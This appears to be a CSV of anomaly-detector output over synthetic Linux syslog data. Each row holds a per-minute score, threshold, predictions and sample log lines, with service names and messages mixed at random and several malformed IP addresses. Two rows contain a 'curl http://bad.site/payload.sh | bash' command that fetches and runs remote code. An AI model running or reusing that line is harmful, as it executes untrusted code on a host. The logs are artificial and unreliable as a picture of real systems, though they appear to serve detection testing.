bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 00:13:00,0.9999367404123137,1,1,0.8224995273096307,3,62,NetworkManager: Started CUPS Scheduler. || systemd: Finished Daily apt download activities. || logrotate: Accepted publickey for user from 10.0.0.154 port 22 ssh2. || unix_chkpwd: Started CUPS Scheduler. || redis-server: Listening on LVM2 poll daemon
2026-07-01 00:14:00,0.9999972640747057,1,1,0.8224995273096307,3,57,telnetd: Started CUPS Scheduler. || unattended-upgrades: Accepted publickey for user from 10.0.0.160 port 22 ssh2. || systemd: Synced RTC time from system clock. || CRON: Started Session c109 of user root. || gpm: Accepted publickey for user from 10.
2026-07-01 00:15:00,0.9999994719812583,1,1,0.8224995273096307,3,58,xinetd: Rotating log files. || unix_chkpwd: Started Cleanup of Temporary Directories. || ftpd: Accepted publickey for user from 10.0.0.86 port 22 ssh2. || kernel: Listening on LVM2 poll daemon socket. || chronyd: Rotating log files. || redis-server: 
2026-07-01 00:16:00,0.9999993612306374,1,1,0.8224995273096307,3,57,ufw: Started Session c11 of user root. || NetworkManager: Accepted publickey for user from 10.0.0.124 port 22 ssh2. || unix_chkpwd: Accepted publickey for user from 10.0.0.22 port 22 ssh2. || dockerd: Finished Daily apt download activities. || rsyslo
2026-07-01 00:17:00,0.9978807564063367,1,1,0.8224995273096307,3,62,ntpd: Finished Daily apt download activities. || telnetd: Started CUPS Scheduler. || redis-server: Finished Daily apt download activities. || systemd-timesyncd: Finished Daily apt download activities. || kernel: Finished Daily apt download activities
2026-07-01 00:18:00,0.9431052075855464,1,1,0.8224995273096307,3,60,chronyd: Listening on LVM2 poll daemon socket. || docker: Listening on LVM2 poll daemon socket. || telnetd: Failed password for invalid user test from 192.168.1.63549 port 22 ssh2 || CRON: Synced RTC time from system clock. || logrotate: EXT4-fs erro
2026-07-01 00:19:00,0.9919616772035211,1,1,0.8224995273096307,3,58,dockerd: Synced RTC time from system clock. || systemd: Rotating log files. || named: Started CUPS Scheduler. || ufw: Listening on LVM2 poll daemon socket. || ufw: Started CUPS Scheduler. || telnetd: Listening on LVM2 poll daemon socket. || named: Ac
2026-07-01 00:20:00,0.9990823883557668,1,1,0.8224995273096307,3,61,rsyslogd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.61971 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || rsyslogd: Started Cleanup of Temporary Directories. || NetworkManager: Rotating log files. || CRON: Rotating log files. || logrotate: Started Ses
2026-07-01 00:21:00,0.9997585740397418,1,1,0.8224995273096307,3,60,smartd: Listening on LVM2 poll daemon socket. || sshd: Listening on LVM2 poll daemon socket. || systemd: Rotating log files. || CRON: Started Session c68 of user root. || systemd: Listening on LVM2 poll daemon socket. || smartd: Accepted publickey fo
2026-07-01 00:22:00,0.9959348760517162,1,1,0.8224995273096307,3,61,chronyd: Accepted publickey for user from 10.0.0.234 port 22 ssh2. || docker: Finished Daily apt download activities. || docker: Started Cleanup of Temporary Directories. || named: Started Cleanup of Temporary Directories. || ufw: Started Cleanup of 
2026-07-01 00:23:00,0.998805854866672,1,1,0.8224995273096307,3,64,ufw: Started Session c202 of user root. || chronyd: Started CUPS Scheduler. || unattended-upgrades: kernel: Out of memory: Kill process 54218 (python3) score 987 or sacrifice child || smartd: Started Session c126 of user root. || unattended-upgrades:
2026-07-01 00:24:00,0.9970689368090383,1,1,0.8224995273096307,3,61,chronyd: Rotating log files. || cups: Started CUPS Scheduler. || logrotate: Started CUPS Scheduler. || redis-server: Listening on LVM2 poll daemon socket. || telnetd: Started Cleanup of Temporary Directories. || rsyslogd: Started Session c21 of user 
2026-07-01 00:25:00,0.99807214775999,1,1,0.8224995273096307,3,62,sshd: Started Cleanup of Temporary Directories. || unattended-upgrades: Synced RTC time from system clock. || gpm: Synced RTC time from system clock. || ntpd: Synced RTC time from system clock. || chronyd: Accepted publickey for user from 10.0.0.148 
2026-07-01 00:26:00,0.9999876963882479,1,1,0.8224995273096307,3,60,sudo: Started Cleanup of Temporary Directories. || ftpd: Started Session c206 of user root. || sudo: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.18279 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || ufw: Synced RTC time from system clock. || systemd-tim
2026-07-01 00:27:00,0.9999999887134948,1,1,0.8224995273096307,3,61,NetworkManager: Listening on LVM2 poll daemon socket. || ufw: Synced RTC time from system clock. || ntpd: Finished Daily apt download activities. || telnetd: Accepted publickey for user from 10.0.0.177 port 22 ssh2. || CRON: Rotating log files. || xi
2026-07-01 00:28:00,0.999999816950284,1,1,0.8224995273096307,3,59,xinetd: Started Session c180 of user root. || sudo: Listening on LVM2 poll daemon socket. || smartd: Started Session c113 of user root. || unix_chkpwd: Started CUPS Scheduler. || gpm: Failed password for invalid user test from 192.168.1.55674 port 22
2026-07-01 00:29:00,0.9999712514652475,1,1,0.8224995273096307,3,55,unattended-upgrades: Started Session c147 of user root. || systemd-timesyncd: Accepted publickey for user from 10.0.0.207 port 22 ssh2. || ufw: Synced RTC time from system clock. || rsyslogd: Started Cleanup of Temporary Directories. || kernel: Start
2026-07-01 00:30:00,0.9999952259379166,1,1,0.8224995273096307,3,61,kernel: Rotating log files. || docker: Finished Daily apt download activities. || logrotate: Started Cleanup of Temporary Directories. || docker: Synced RTC time from system clock. || cups: Started Cleanup of Temporary Directories. || logrotate: Rota
2026-07-01 00:31:00,0.9998306546377261,1,1,0.8224995273096307,3,59,dockerd: Rotating log files. || dockerd: Listening on LVM2 poll daemon socket. || ftpd: Accepted publickey for user from 10.0.0.75 port 22 ssh2. || redis-server: Accepted publickey for user from 10.0.0.52 port 22 ssh2. || logrotate: Started CUPS Sche
2026-07-01 00:32:00,0.9999923395560326,1,1,0.8224995273096307,3,62,named: Rotating log files. || smartd: Started Cleanup of Temporary Directories. || CRON: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || telnetd: Started Cleanup of Temporary Directories. || CRON: [
2026-07-01 00:33:00,0.9999999869677649,1,1,0.8224995273096307,3,58,telnetd: Started CUPS Scheduler. || gpm: Started Session c215 of user root. || cups: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started Cleanup of Temporary Directories. || sshd: Started Session c191 of user root. || redis-server: Started 
2026-07-01 00:34:00,0.9999998345459097,1,1,0.8224995273096307,3,63,xinetd: Started Cleanup of Temporary Directories. || unix_chkpwd: Started CUPS Scheduler. || ufw: Started Cleanup of Temporary Directories. || kernel: Started Session c221 of user root. || rsyslogd: Rotating log files. || logrotate: Listening on LVM2
2026-07-01 00:35:00,0.999999075985806,1,1,0.8224995273096307,3,60,docker: Started Cleanup of Temporary Directories. || systemd: Listening on LVM2 poll daemon socket. || dockerd: Started Cleanup of Temporary Directories. || ufw: Finished Daily apt download activities. || ftpd: Started Cleanup of Temporary Directorie
2026-07-01 00:36:00,0.9999862457506603,1,1,0.8224995273096307,3,62,ntpd: Synced RTC time from system clock. || sshd: Started Session c222 of user root. || gpm: Rotating log files. || kernel: Started CUPS Scheduler. || rsyslogd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Finished Daily apt download a
2026-07-01 00:37:00,0.9999458035094753,1,1,0.8224995273096307,3,58,systemd-timesyncd: Synced RTC time from system clock. || ntpd: Started CUPS Scheduler. || xinetd: Finished Daily apt download activities. || telnetd: Started Session c151 of user root. || gpm: Rotating log files. || chronyd: Synced RTC time from syst
2026-07-01 00:38:00,0.9995410392334483,1,1,0.8224995273096307,3,58,xinetd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || cups: Synced RTC time from system clock. || ftpd: Started Session c189 of user root. || telnetd: Rotating log files. || xinetd: Started Cleanu
2026-07-01 00:39:00,0.9998351467682917,1,1,0.8224995273096307,3,62,rsyslogd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || CRON: Accepted publickey for user from 10.0.0.145 port 22 ssh2. || ftpd: Listening on LVM2 poll daemon socket. || redis-server: Listening on
2026-07-01 00:40:00,0.99998505301881,1,1,0.8224995273096307,3,61,ntpd: Started Cleanup of Temporary Directories. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || CRON: Accepted publickey for user from 10.0.0.84 port 22 ssh2. || chronyd: Rotating log files. || cups: Listening on LVM2 poll daemon socke
2026-07-01 00:41:00,0.9999999977554224,1,1,0.8224995273096307,3,64,chronyd: Started Session c32 of user root. || NetworkManager: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started CUPS Scheduler. || dockerd: Started CUPS Scheduler. || gpm: Started CUPS Scheduler. || kernel: Started Cleanup of Temporary Di
2026-07-01 00:42:00,0.9999973553918708,1,1,0.8224995273096307,3,58,gpm: Listening on LVM2 poll daemon socket. || systemd: Started Cleanup of Temporary Directories. || dockerd: Started Cleanup of Temporary Directories. || redis-server: Started CUPS Scheduler. || sshd: Started Cleanup of Temporary Directories. || chro
2026-07-01 00:43:00,0.9141558637116994,1,1,0.8224995273096307,3,56,xinetd: Started Cleanup of Temporary Directories. || ntpd: Started Cleanup of Temporary Directories. || rsyslogd: Listening on LVM2 poll daemon socket. || gpm: Started Cleanup of Temporary Directories. || systemd: Accepted publickey for user from 10.
2026-07-01 00:44:00,0.9092782329161605,1,1,0.8224995273096307,3,57,smartd: Started Cleanup of Temporary Directories. || rsyslogd: Accepted publickey for user from 10.0.0.97 port 22 ssh2. || docker: Synced RTC time from system clock. || unattended-upgrades: Rotating log files. || unix_chkpwd: Started Session c118 of 
2026-07-01 00:45:00,0.9992636835821591,1,1,0.8224995273096307,3,58,NetworkManager: Rotating log files. || named: Synced RTC time from system clock. || xinetd: Finished Daily apt download activities. || gpm: Started Cleanup of Temporary Directories. || gpm: Started Cleanup of Temporary Directories. || logrotate: Acce
2026-07-01 00:46:00,0.9966009907584937,1,1,0.8224995273096307,3,62,redis-server: Rotating log files. || logrotate: Rotating log files. || sshd: Listening on LVM2 poll daemon socket. || rsyslogd: Started CUPS Scheduler. || ftpd: Started Cleanup of Temporary Directories. || systemd-timesyncd: Started CUPS Scheduler. |
2026-07-01 00:47:00,0.9606599663386947,1,1,0.8224995273096307,3,61,systemd: Listening on LVM2 poll daemon socket. || kernel: Listening on LVM2 poll daemon socket. || kernel: Listening on LVM2 poll daemon socket. || named: Rotating log files. || docker: Started Session c23 of user root. || rsyslogd: Started Cleanup o
2026-07-01 00:48:00,0.9994509398857314,1,1,0.8224995273096307,3,62,logrotate: Finished Daily apt download activities. || xinetd: Finished Daily apt download activities. || systemd-timesyncd: Started Session c84 of user root. || logrotate: Synced RTC time from system clock. || ufw: Finished Daily apt download activit
2026-07-01 00:49:00,0.9999993387260101,1,1,0.8224995273096307,3,56,ftpd: Finished Daily apt download activities. || chronyd: Started CUPS Scheduler. || unattended-upgrades: Listening on LVM2 poll daemon socket. || CRON: Started CUPS Scheduler. || kernel: Finished Daily apt download activities. || rsyslogd: Started C
2026-07-01 00:50:00,0.9999985569693235,1,1,0.8224995273096307,3,58,unattended-upgrades: Accepted publickey for user from 10.0.0.224 port 22 ssh2. || dockerd: Accepted publickey for user from 10.0.0.163 port 22 ssh2. || sshd: Rotating log files. || ufw: Started Cleanup of Temporary Directories. || logrotate: kernel: 
2026-07-01 00:51:00,0.9983384676359185,1,1,0.8224995273096307,3,59,chronyd: Started Session c4 of user root. || unix_chkpwd: Started Cleanup of Temporary Directories. || ftpd: Rotating log files. || kernel: Started Session c57 of user root. || cups: Accepted publickey for user from 10.0.0.247 port 22 ssh2. || Networ
2026-07-01 00:52:00,0.9899981297910839,1,1,0.8224995273096307,3,59,unix_chkpwd: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon socket. || ufw: Listening on LVM2 poll daemon socket. || sshd: Listening on LVM2 poll daemon socket. || logrotate: Finished Daily apt download activities. 
2026-07-01 00:53:00,0.9998848018475358,1,1,0.8224995273096307,3,62,telnetd: kernel: Out of memory: Kill process 7131 (python3) score 987 or sacrifice child || dockerd: Synced RTC time from system clock. || xinetd: Started Session c232 of user root. || ntpd: Failed password for invalid user test from 192.168.1.53906 
2026-07-01 00:54:00,0.9996753827628542,1,1,0.8224995273096307,3,61,gpm: Started CUPS Scheduler. || unattended-upgrades: Finished Daily apt download activities. || cups: Finished Daily apt download activities. || kernel: Started Cleanup of Temporary Directories. || redis-server: Finished Daily apt download activities
2026-07-01 00:55:00,0.98713495823029,1,1,0.8224995273096307,3,61,systemd-timesyncd: Rotating log files. || kernel: Synced RTC time from system clock. || unix_chkpwd: Accepted publickey for user from 10.0.0.248 port 22 ssh2. || smartd: Started Cleanup of Temporary Directories. || NetworkManager: Started Session c22
2026-07-01 00:56:00,0.9979012075631235,1,1,0.8224995273096307,3,59,logrotate: Started Cleanup of Temporary Directories. || telnetd: Started Cleanup of Temporary Directories. || cups: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || named: Started Session c79 of user root. || 
2026-07-01 00:57:00,0.9997120593695276,1,1,0.8224995273096307,3,60,sshd: Synced RTC time from system clock. || NetworkManager: Started Session c184 of user root. || sshd: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started Session c32 of user root. || chr
2026-07-01 00:58:00,0.9764799568130582,1,1,0.8224995273096307,3,58,ftpd: Started Session c231 of user root. || gpm: Accepted publickey for user from 10.0.0.156 port 22 ssh2. || smartd: Finished Daily apt download activities. || chronyd: Finished Daily apt download activities. || cups: Finished Daily apt download act
2026-07-01 00:59:00,0.9938132632453752,1,1,0.8224995273096307,3,58,dockerd: Accepted publickey for user from 10.0.0.234 port 22 ssh2. || telnetd: Finished Daily apt download activities. || sudo: Listening on LVM2 poll daemon socket. || redis-server: Started Session c253 of user root. || chronyd: Listening on LVM2 po
2026-07-01 01:00:00,0.997141932074257,1,1,0.8224995273096307,3,60,systemd-timesyncd: Started Cleanup of Temporary Directories. || rsyslogd: Started Session c87 of user root. || gpm: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started Session c117 of user root. || NetworkManager: [UFW BLOCK] IN=eth0 OUT= M
2026-07-01 01:01:00,0.9999703242985015,1,1,0.8224995273096307,3,61,xinetd: Started Session c245 of user root. || dockerd: Accepted publickey for user from 10.0.0.163 port 22 ssh2. || ftpd: Finished Daily apt download activities. || xinetd: Accepted publickey for user from 10.0.0.91 port 22 ssh2. || docker: Accepted 
2026-07-01 01:02:00,0.9957651539598332,1,1,0.8224995273096307,3,60,cups: Finished Daily apt download activities. || rsyslogd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || xinetd: Started Cleanup of Temporary Directories. || smartd: Accepted publickey for user from 10.0.0.
2026-07-01 01:03:00,0.9962266033483235,1,1,0.8224995273096307,3,59,chronyd: Started Cleanup of Temporary Directories. || docker: Finished Daily apt download activities. || ufw: Rotating log files. || telnetd: Started Session c147 of user root. || chronyd: Rotating log files. || NetworkManager: Rotating log files. ||
2026-07-01 01:04:00,0.9996242935216553,1,1,0.8224995273096307,3,61,ntpd: Listening on LVM2 poll daemon socket. || docker: Started CUPS Scheduler. || sudo: Started Session c213 of user root. || ftpd: Synced RTC time from system clock. || kernel: Listening on LVM2 poll daemon socket. || gpm: Synced RTC time from syste
2026-07-01 01:05:00,0.9999999561233738,1,1,0.8224995273096307,3,60,gpm: Synced RTC time from system clock. || telnetd: Started CUPS Scheduler. || NetworkManager: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || smartd: Finished Daily apt download activities. || unix
2026-07-01 01:06:00,0.9999999217828416,1,1,0.8224995273096307,3,59,ufw: Started Session c189 of user root. || cups: Started Cleanup of Temporary Directories. || chronyd: Synced RTC time from system clock. || sshd: Started CUPS Scheduler. || dockerd: Started Session c22 of user root. || logrotate: Started CUPS Schedu
2026-07-01 01:07:00,0.9996419864375304,1,1,0.8224995273096307,3,60,ntpd: Started CUPS Scheduler. || systemd-timesyncd: Rotating log files. || named: Listening on LVM2 poll daemon socket. || chronyd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || smartd: Rotating log files. || NetworkManager: Started Ses
2026-07-01 01:08:00,0.999927809160896,1,1,0.8224995273096307,3,61,unix_chkpwd: Rotating log files. || gpm: Accepted publickey for user from 10.0.0.99 port 22 ssh2. || sshd: Synced RTC time from system clock. || dockerd: Synced RTC time from system clock. || dockerd: Started Cleanup of Temporary Directories. || ftpd
2026-07-01 01:09:00,0.999624074116735,1,1,0.8224995273096307,3,61,unix_chkpwd: Started Session c55 of user root. || sudo: Started Session c8 of user root. || redis-server: Finished Daily apt download activities. || logrotate: Started CUPS Scheduler. || ntpd: Started Session c168 of user root. || CRON: kernel: Kerne
2026-07-01 01:10:00,0.9999973584464438,1,1,0.8224995273096307,3,58,dockerd: Started Cleanup of Temporary Directories. || gpm: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started CUPS Scheduler. || telnetd: Finished Daily apt download activities. || chronyd: Started Cleanup of Temporary Directories. || rsys
2026-07-01 01:11:00,0.9999990416593554,1,1,0.8224995273096307,3,64,rsyslogd: Rotating log files. || NetworkManager: Rotating log files. || systemd: Accepted publickey for user from 10.0.0.233 port 22 ssh2. || unattended-upgrades: Started CUPS Scheduler. || sudo: Synced RTC time from system clock. || named: Synced RT
2026-07-01 01:12:00,0.9999988876302254,1,1,0.8224995273096307,3,59,gpm: Started Session c157 of user root. || ftpd: Started CUPS Scheduler. || unix_chkpwd: Listening on LVM2 poll daemon socket. || NetworkManager: Started Session c40 of user root. || rsyslogd: Started Cleanup of Temporary Directories. || systemd: Sta
2026-07-01 01:13:00,0.9999805326294734,1,1,0.8224995273096307,3,61,rsyslogd: Finished Daily apt download activities. || redis-server: Rotating log files. || telnetd: Finished Daily apt download activities. || smartd: Started Cleanup of Temporary Directories. || gpm: Listening on LVM2 poll daemon socket. || gpm: Star
2026-07-01 01:14:00,0.9999875368636777,1,1,0.8224995273096307,3,58,sshd: Synced RTC time from system clock. || rsyslogd: Finished Daily apt download activities. || systemd: Started CUPS Scheduler. || sshd: Listening on LVM2 poll daemon socket. || chronyd: Synced RTC time from system clock. || redis-server: Accepted 
2026-07-01 01:15:00,0.9999954108482024,1,1,0.8224995273096307,3,60,xinetd: Synced RTC time from system clock. || unix_chkpwd: Rotating log files. || cups: Started Cleanup of Temporary Directories. || redis-server: Synced RTC time from system clock. || rsyslogd: Started Cleanup of Temporary Directories. || gpm: Liste
2026-07-01 01:16:00,0.9999999256128516,1,1,0.8224995273096307,3,60,redis-server: Listening on LVM2 poll daemon socket. || chronyd: Accepted publickey for user from 10.0.0.47 port 22 ssh2. || logrotate: Started CUPS Scheduler. || kernel: kernel: Out of memory: Kill process 53975 (python3) score 987 or sacrifice child
2026-07-01 01:17:00,0.9999999615311809,1,1,0.8224995273096307,3,59,telnetd: Started CUPS Scheduler. || cups: Started Cleanup of Temporary Directories. || redis-server: Finished Daily apt download activities. || CRON: Accepted publickey for user from 10.0.0.75 port 22 ssh2. || sshd: Started Cleanup of Temporary Direc
2026-07-01 01:18:00,0.9999931084456039,1,1,0.8224995273096307,3,59,ufw: Started Cleanup of Temporary Directories. || sshd: Rotating log files. || redis-server: Rotating log files. || ntpd: Synced RTC time from system clock. || systemd-timesyncd: Started Session c217 of user root. || ntpd: Rotating log files. || redi
2026-07-01 01:19:00,0.9936672777955302,1,1,0.8224995273096307,3,58,systemd-timesyncd: Started CUPS Scheduler. || systemd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Listening on LVM2 poll daemon socket. || gpm: Started Session c163 of user root. || ftpd: Finished Daily apt download activities. || CRON: St
2026-07-01 01:20:00,0.9905991371308588,1,1,0.8224995273096307,3,61,docker: Synced RTC time from system clock. || ntpd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || CRON: Finished Daily apt download activities. || ntpd: Synced RTC time from system clock. || telnetd: Failed password for invalid user tes
2026-07-01 01:21:00,0.9836284614934598,1,1,0.8224995273096307,3,63,CRON: Synced RTC time from system clock. || redis-server: Started CUPS Scheduler. || NetworkManager: Rotating log files. || systemd-timesyncd: Finished Daily apt download activities. || xinetd: Finished Daily apt download activities. || kernel: Start
2026-07-01 01:22:00,0.9995119393289749,1,1,0.8224995273096307,3,60,kernel: Synced RTC time from system clock. || ntpd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || kernel: Finished Daily apt download activities. || CRON: Started Session c210 of user root. || sys
2026-07-01 01:23:00,0.996412402170963,1,1,0.8224995273096307,3,57,NetworkManager: Accepted publickey for user from 10.0.0.44 port 22 ssh2. || xinetd: Listening on LVM2 poll daemon socket. || redis-server: Started CUPS Scheduler. || telnetd: Synced RTC time from system clock. || NetworkManager: Listening on LVM2 pol
2026-07-01 01:24:00,0.99900003484461,1,1,0.8224995273096307,3,60,docker: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.30520 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || ftpd: Started CUPS Scheduler. || CRON: kernel: Kernel panic - not syncing: Fatal exception || xinetd: Started Session c220 of user root. || cups: S
2026-07-01 01:25:00,0.9994770232743843,1,1,0.8224995273096307,3,64,systemd: Finished Daily apt download activities. || ftpd: Synced RTC time from system clock. || systemd: Synced RTC time from system clock. || docker: Finished Daily apt download activities. || telnetd: Synced RTC time from system clock. || chronyd: 
2026-07-01 01:26:00,0.9999923636852754,1,1,0.8224995273096307,3,62,ntpd: Accepted publickey for user from 10.0.0.152 port 22 ssh2. || systemd-timesyncd: Finished Daily apt download activities. || gpm: Finished Daily apt download activities. || dockerd: Listening on LVM2 poll daemon socket. || rsyslogd: Started Clean
2026-07-01 01:27:00,0.9998768262544231,1,1,0.8224995273096307,3,65,CRON: Finished Daily apt download activities. || ftpd: Started Session c61 of user root. || unix_chkpwd: Started Session c57 of user root. || cups: Started Session c169 of user root. || ftpd: Accepted publickey for user from 10.0.0.66 port 22 ssh2. |
2026-07-01 01:28:00,0.9994889667294763,1,1,0.8224995273096307,3,58,cups: Started Cleanup of Temporary Directories. || CRON: Rotating log files. || ufw: Started CUPS Scheduler. || rsyslogd: Listening on LVM2 poll daemon socket. || NetworkManager: Started Cleanup of Temporary Directories. || sshd: Rotating log files. 
2026-07-01 01:29:00,0.9681720367241358,1,1,0.8224995273096307,3,59,ntpd: Finished Daily apt download activities. || named: Listening on LVM2 poll daemon socket. || logrotate: Accepted publickey for user from 10.0.0.86 port 22 ssh2. || sudo: Started CUPS Scheduler. || smartd: Started Cleanup of Temporary Directories.
2026-07-01 01:30:00,0.8224995273096307,1,1,0.8224995273096307,3,57,chronyd: Started Session c161 of user root. || ntpd: Listening on LVM2 poll daemon socket. || ftpd: Accepted publickey for user from 10.0.0.225 port 22 ssh2. || named: Started CUPS Scheduler. || gpm: Started Session c204 of user root. || redis-server
2026-07-01 01:31:00,0.9542564077317405,1,1,0.8224995273096307,3,59,redis-server: Accepted publickey for user from 10.0.0.142 port 22 ssh2. || sshd: Rotating log files. || dockerd: Finished Daily apt download activities. || sshd: Finished Daily apt download activities. || ftpd: Accepted publickey for user from 10.0.0
2026-07-01 01:32:00,0.9996774641023795,1,1,0.8224995273096307,3,60,dockerd: Finished Daily apt download activities. || docker: Started Cleanup of Temporary Directories. || NetworkManager: Started Cleanup of Temporary Directories. || unix_chkpwd: Finished Daily apt download activities. || CRON: Rotating log files. ||
2026-07-01 01:33:00,0.9984038827848757,1,1,0.8224995273096307,3,63,smartd: Rotating log files. || CRON: Started Cleanup of Temporary Directories. || named: Rotating log files. || ntpd: Started CUPS Scheduler. || rsyslogd: Started Session c97 of user root. || sshd: Started Session c3 of user root. || smartd: Synced R
